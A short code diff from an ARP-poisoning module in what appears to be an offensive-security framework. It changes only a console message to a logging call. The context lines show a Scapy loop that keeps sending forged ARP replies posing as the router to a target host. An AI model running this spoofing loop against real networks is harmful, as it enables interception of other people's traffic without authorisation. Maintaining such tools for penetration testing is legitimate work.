@@ -29,7 +29,7 @@ class Arpoison(Module):
 
         arp = ARP(op=1, psrc=self.router.get(), pdst=self.target.get(), hwdst=mac)
 
-        self.console.writeln('[+] sending packets... press Ctrl+C to quit.')
+        self.console.info('sending packets... press Ctrl+C to quit.')
         try:
             while True:
                 send(arp, verbose=False)
